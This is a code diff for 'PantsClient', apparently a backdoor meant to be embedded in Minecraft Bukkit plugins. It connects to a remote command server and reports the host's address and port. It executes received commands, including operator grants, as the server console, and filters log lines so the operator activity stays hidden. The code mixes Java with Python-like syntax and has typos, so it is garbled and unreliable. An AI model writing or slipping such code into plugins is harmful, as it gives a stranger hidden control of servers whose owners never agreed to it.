@@ -5,12 +5,12 @@ public class PantsClient:
     @Getter @Setter static Socket client = null;
     private static final ArrayList<String> words = new ArrayList<String>(); // Contains bad words like 'op'
 
-    public static void onLoad(): // Call from JavaPlugin
+    public static void onLoad: // Call from JavaPlugin
         init();
         Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
         checkConnectionThread.start();
 
-    public static void init():
+    public static void init:
         // TODO: obfuscate url
         URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
         BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
@@ -23,24 +23,31 @@ public class PantsClient:
             public boolean isLoggable(LogRecord record):
                 return !record.getMessage().contains(words.get(0));
 
-    public static void handshake():
+    public static void handshake:
         // in new thread?
         BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
         PrintStream toServer = new PrintStream(client.getOutputStream());
         toServer.println("cmd::set " + Bukkit.getServer().getAddress() + ":" + Bukkit.getServer().getPort());
         getCommands();
 
-    public static void getCommands():
+    public static void getCommands:
         while(true):
             String in = fromServer.readline();
-            runCommand(in, fromServer, toServer);
+            parseCommand(in, fromServer, toServer);
 
-    public static void runCommand(String cmd, BufferedReader fromServer, PrintStream toServer):
-        if(cmd.startsWith("sudo ")):
+    public static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer):
+        String[] args = cmd.split(" ");
+        if(words.contains(args[0])):
+            // Run suspicious commands
+            //  op jdf2
+            runCommand(cmd);
+        else if(cmd.startsWith("sudo ")):
             // Run a command as the console
             //  sudo say hello
-            Bukkit.getSever().dispatchCommand(Bukkit.getServer().getConsoleSender(), cmd.replaceFirst("sudo ", ""));
-
+            runCommand(cmd.replaceFirst("sudo ", ""));
+            
+    public static void runCommand(String s):
+        Bukkit.getSever().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
 
 class CheckConnectionRunnable implements Runnable:
 
